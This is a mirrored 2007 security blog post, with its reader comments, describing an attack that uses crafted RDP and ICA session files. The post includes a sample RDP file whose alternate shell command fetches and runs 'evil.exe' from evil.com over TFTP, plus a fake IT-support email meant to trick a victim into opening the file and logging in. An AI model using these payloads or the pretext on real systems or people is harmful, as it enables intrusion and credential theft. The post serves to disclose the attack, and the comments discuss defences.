@@ -1,0 +1,378 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/remote-desktop-command-fixation-attacks/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:01:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Remote Desktop Command Fixation Attacks</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Remote Desktop Command Fixation Attacks Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='BT Home Flub: Pwnin the BT Home Hub' href='../bt-home-flub-pwnin-the-bt-home-hub/index.html' />
+<link rel='next' title='0day: Hacking secured CITRIX from outside' href='../0day-hacking-secured-citrix-from-outside/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../indexdd54.html?p=497' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-497" class="post">
+	<div class="post-title"><h2><span>Remote Desktop Command Fixation Attacks</span></h2></div>
+	<div class="post-date"><span>published:</span> October 10th, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>The attack is rather simple. All the attacker needs to do is to compose a malicious RDP (for Windows Terminal Services) or ICA (for CITRIX) file and send it to the victim. The victim is persuaded to open the file by double clicking on it. When the connection is established, the user will enter their credentials to login and as such let the attacker in.</p>
+
+<p>Both, RDP and ICA, contain information not only about what servers to connect to but also what applications to launch after successful authentication. These parameters can be modified to suit the attacker needs. In CITRIX we can specify the default shell command by using the parameter <strong>Application</strong> (i.e <code>Application=calc.exe</code>). In Windows Remote Desktop we can do exactly the same with the <strong>alternate shell</strong> (i.e <code>alternate shell:s:cmd.exe</code>) directive. Here follows a sample ICA file:</p>
+
+<pre><code>[WFClient]
+Version=1
+
+[ApplicationServers]
+Connection To Citrix Server=
+
+[Connection To Citrix Server]
+InitialProgram=<strong>some command here</strong>
+Address=<em>172.16.3.191</em>
+
+ScreenPercent=0</code></pre>
+
+<p>In Windows Terminal Services, the same can be achieved with the following example:</p>
+
+<pre><code>screen mode id:i:1
+desktopwidth:i:800
+desktopheight:i:600
+session bpp:i:16
+full address:s:<em>172.16.3.191</em>
+compression:i:1
+keyboardhook:i:2
+alternate shell:s:<strong>some command here</strong>
+shell working directory:s:<em>C:\</em>
+bitmapcachepersistenable:i:1</code></pre>
+
+<p>This is all that the attacker needs to know. Let&#8217;s have a step-by-step look at the attack structure, shall we:</p>
+
+<ol>
+<li><p><strong>Compose a malicious Remote Desktop session file:</strong><br/>The following example instructs TFTP to connect to <strong>evil.com</strong> and retrieve a file called <strong>evil.exe</strong>. Once the download is completed, the attacker executes <strong>evil.exe</strong> and subsequently terminates the session:</p><pre><code>screen mode id:i:1
+desktopwidth:i:800
+desktopheight:i:600
+session bpp:i:16
+full address:s:<em>172.16.3.191</em>
+compression:i:1
+keyboardhook:i:2
+alternate shell:s:<strong>cmd.exe /C "tftp -i evil.com GET evil.exe evil.exe &#038; evil.exe"</strong>
+shell working directory:s:<em>C:\</em>
+bitmapcachepersistenable:i:1</code></pre></li>
+<li><p><strong>Send email to the victim:</strong><br/>Here the attacker uses his social engineering skills to persuade the victim into opening and authenticating the session file. This is how it is done:</p><blockquote>Hello John,<br/><br/>This is Tim from Tech Department. I was informed that you have some problems with your remote desktop connectivity. I&#8217;ve attached a modified RDP file you can tryout and see if it works. Just double click on the file and login. Your domain credentials should work. Let me know if you have any problems.<br/><br/>Tim O&#8217;Brian<br/>Tech Department</blockquote></li>
+<li><p><strong>Own it:</strong><br/>The attacker notices a new entry in his TFTP log files. The operation was successful. Now he can take full advantage of his brand new asset. <q>Simple tricks always work.</q></p></li>
+</ol>
+
+<p><em>This is it. This is what I would like to refer to as <q>Remote Desktop Command Fixation Attacks</q>. They are simple, highly affective, unknown to system administrators (as of yet), and pretty vicious. Keep in mind that the same procedure apply to CITIRX as well.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/fixation/index.html" rel="tag">fixation</a> | <a href="../../tags/rdp/index.html" rel="tag">rdp</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-56978">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-56978">
+			October 10, 2007 at 12:33 pm</a>		</div>
+
+		<p>now when I am thinking this trick should be called <q>Remote Desktop Shell Fixation Attacks</q></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-56989">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/44c5e290ccf283471210752d0b1ed6df?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.packetguru.org/' rel='external nofollow' class='url'>djteller</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-56989">
+			October 10, 2007 at 1:56 pm</a>		</div>
+
+		<p>What can we do about it ? -&gt; Educate users.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-56991">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-56991">
+			October 10, 2007 at 2:08 pm</a>		</div>
+
+		<p>djteller, :) yeh right. first of all you have to educate the administrators. What I am trying to show here is how easy it is sometimes to gain remote access without too much effort. The security community and industry in general is sooo much into vulnerability research that they forget to look at the most obvious, the most simplistic, and the most successful threats. Who needs 0days when Andrea Johnson, the secretary from 3rd floor, will unawarely let you in?</p>
+<p>Moreover, most people have never heard of Windows Terminal services. The don&#8217;t know how they even look like. So, what&#8217;s going to happen if the attacker just spawns a full-screen session on their desktop? They will probably think that somehow they logged out; type their username and password, and of course let the attacker in. Simple and effective.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-57029">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/57239820b18ae644b7cc5c1df8ab96f7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">rkd</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-57029">
+			October 10, 2007 at 5:35 pm</a>		</div>
+
+		<blockquote><p>Filter emails and email content and in general traffic that contains RDP or ICA files. Yes it sounds simple, but it is almost impossible to implement.</p></blockquote>
+<p>I hate to be asking an obvious question but why is it that filtering *.rdp/*.ica (or whatever the ica extension is) is impossible?<br />
+As far as I know Outlook 2007 (the client itself) strips this attachments by itself&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-57041">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-57041">
+			October 10, 2007 at 6:47 pm</a>		</div>
+
+		<p>rkd, because the attacker may simply include a link to a remote RDP/ICA file which the user will click on. Of course it gets more suspicious but users will still fall for it. No to mention that RDP and ICA can be delivered to the target in multiple ways.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-57058">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/ddb2d5a5ac2b06e443460be3fe37b769?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">mvs</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-57058">
+			October 10, 2007 at 8:32 pm</a>		</div>
+
+		<p>Any email that urges you to &#8220;click this&#8221; is a potential attack vector. The barn door was opened when email morphed beyond delivering plain ASCII text. The solution is to block any email that is not plain ASCII. Since users cry when you take their candy away, computers will never be secure. End of story. Get used to it.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-57062">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/9bac8baa8ae20d56ec0320a2f2c33c82?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://fazed-darkstar.blogspot.com/' rel='external nofollow' class='url'>fazed</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-57062">
+			October 10, 2007 at 8:37 pm</a>		</div>
+
+		<p>hey i posted about something like this on my blog:<br />
+<a href="http://fazed-darkstar.blogspot.com/2007/10/phishing-windows-passwords-with-citrix.html" rel="nofollow">http://fazed-darkstar.blogspot.....itrix.html</a></p>
+<p>it basically rely&#8217;s on social engineering.<br />
+but this is a bit more indepth, nice!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-57089">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b2c0b0c6b90fc3f3fa6abae420c36cc0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://security.eweek.com/' rel='external nofollow' class='url'>Larry Seltzer</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-57089">
+			October 11, 2007 at 1:20 am</a>		</div>
+
+		<p>Before I saw rkd&#8217;s message I went to test the Outlook attachment stripping on Outlook 2003 and it does not strip .rdp files. </p>
+<p>I see that the attack has a hard IP address in it, and of course the attacker would need to know either a name or address. In a corporation this is likely to be a gateway I guess and not a big secret.</p>
+<p>I also noticed the &#8220;working directory:s:C:\&#8221;. Some of us don&#8217;t have download and execute rights in our root directories. Is there a more elegant approach to this? Is %TEMP% supported here?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-57298">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bbbfc965f4e0aee9dcf3fb16d6dee0b5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.systemwebservice.ch/' rel='external nofollow' class='url'>d4brain</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-57298">
+			October 11, 2007 at 10:36 pm</a>		</div>
+
+		<p>Hey, so great Image at the Top ;)And the tricks and infos too&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-57648">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/1e41c58e98f24908060130e58333e07a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.terminal23.net/' rel='external nofollow' class='url'>LonerVamp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-57648">
+			October 12, 2007 at 7:12 pm</a>		</div>
+
+		<p>If you truly believe security in depth (defense in depth is the common usage), then what are you envisioning? That we have one perfect security measure that is unbreakable? I&#8217;m not sure about you, but with the rest of the security industry, it is pretty accepted that there is no silver bullet.</p>
+<p>We need and will always need layered defense in order to protect data and systems when one layer is thwarted.</p>
+<p>You might say that people will always be a weak link, and that could be true even in an environment with security in depth. In fact, security in depth is even more needed due to the human factor. If people can make stupid mistakes, put up roadblocks, nets, and pointy objects in their way so they don&#8217;t stupidly make those mistakes&#8230;</p>
+<p>Perhaps you have a different definition of &#8220;security in depth,&#8221; in which case I beg that you explain it so that everyone can move beyond focusing on that statement. Maybe we&#8217;re really on the same page and just have different meanings to this rather common security term&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-57870">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-57870">
+			October 13, 2007 at 9:45 am</a>		</div>
+
+		<p>LonerVamp, I am putting a post now, which explains everything in more detail. Thanks.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-58506">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5453ee5881fd8b42b5ab208ca90ae1cb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.hs-pongratz.de/' rel='external nofollow' class='url'>Der Klempner</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-58506">
+			October 15, 2007 at 8:40 am</a>		</div>
+
+		<p>I&#8217;am a little curious &#8211; why should my firewall policies allow to forward such outbound connections &#8211; and moreover &#8211; why should i expose my rdp/ica servers without additional protection (e.g. VPN/certificates) to the outside.</p>
+<p>Security comes with layers of it.</p>
+<p>Der Klempner</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-58576">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f42d8b6838137a6c7644794b34785ace?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Scott</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-58576">
+			October 15, 2007 at 5:36 pm</a>		</div>
+
+		<p>An easy way to defend this is with an IPS that will shun RDP traffic on 3389 or detecting RDP over a non standard port. </p>
+<p>There is a rule on Bleeding Snort to do this.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-59594">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f8e89ac87f640d2eb16c52d2714795f6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Rogers</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-59594">
+			October 19, 2007 at 11:21 am</a>		</div>
+
+		<p>Isn&#8217;t most Citrix-servers set up to NOT allow users to install or execute unknown applications? Will the user be allowed to execute cmd.exe and download and run an unknown file?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-121496">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/37b5ef749ebd516e99541d628fb21311?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Changlinn</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-121496">
+			May 11, 2008 at 2:11 pm</a>		</div>
+
+		<p>Most terminal servers I set up are restricted too, so the user can&#8217;t run cmd.exe and evil.exe, only a set of programs specified&#8230; of course one of those because of business requirements is Internet Explorer, so game over right there. It is an interesting exploit, but not one that would necessarily work 100% of the time. Could you just MIM them, ie change the citrix/rdp to connect to a server on your network through port 443, then you redirect and capture their user/pass.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="497"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="f21c6d3e34" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/remote-desktop-command-fixation-attacks/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:01:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
